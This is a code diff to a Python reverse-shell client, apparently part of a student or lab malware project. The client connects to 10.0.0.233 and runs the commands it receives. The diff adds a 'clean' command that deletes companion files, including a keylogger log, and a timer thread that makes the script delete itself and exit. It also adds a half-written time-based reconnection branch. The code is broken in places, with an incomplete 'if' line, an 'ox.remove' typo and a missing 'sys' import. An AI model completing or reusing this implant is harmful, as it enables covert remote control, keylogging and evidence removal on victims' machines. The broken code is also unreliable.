@@ -1,6 +1,8 @@
 import socket
 import subprocess
 import os
+import threading
+import datetime
 
 # Call to
 call_to_ip = '10.0.0.233'
@@ -13,14 +15,39 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # Connect socket
 s.connect((call_to_ip, call_to_port))
 
+'''
+    Creates a thread to handle the final clean up including removing itself from the system
+'''
+def schedule_exit(delay_time):
+    
+    def delayed_exit():
+        curr_path = os.path.realpath(__file__) # Current file path
+
+        try:
+            os.remove(curr_path)
+        except Exception as e:
+            print(f"Failed to delete script: {str(e)}\n")
+
+        sys.exit(0) # Exits program
+    
+    threading.Timer(delay_time, delayed_exit).start() # Start executor thread
+
+
 while True:                                    # Loop until killed
     try:
         command = s.recv(1024).decode("utf-8").strip() # Catch commands being sent
 
+        if connectionTime == 
+
         if command.lower() == "exit":          # Exit program
                                                #? Might be good to add additional work hear later
             s.close()
-            break
+
+        # Time based reconnection for the reverse shell
+        elif command.startswith("time "):
+            start = command[5:] # Parse restart time
+
+
         
         elif command.startswith("cd "):        # Change directories
             try:
@@ -45,7 +72,45 @@ while True:                                    # Loop until killed
                 continue
         
         # elif command.startswith("clean"):
-            # 
+            # #
+
+        elif command.strip().lower() == "clean":
+            '''
+                Currently file locations are in known static locations
+                For the project we are keeping them all in 1 directory
+                Could be placed and cleaned anywhere
+            '''
+            try:
+                files_to_clean = [
+                    "deployPer.py",
+                    "log.py",
+                    "sliBuy.html",
+                    "keyloggerLogs.txt"
+                ]
+
+                # Validate & remove
+                for filePath in files_to_clean:
+                    if os.path.exists(filePath):
+                        try:
+                            ox.remove(filePath)
+                            s.send(f"File removed: {filePath}\n")
+                        except Exception as e:
+                            s.send(f"Failed to remove {filePath}: {str(e)}\n".encode("utf-8"))
+                    else:
+                        s.send(f"File not found: {filePath}\n".encode("utf-8"))
+                
+                schedule_exit(10) # Start executioner thread
+                s.send(f"Executioner thread started".encode("utf-8"))
+
+            except Exception as e:
+                s.send(f"Clean failure: {e}\n".encode("utf-8"))
+
+
+
+            
+
+        
+
 
         elif command.strip().lower() == "rtv":
             try:
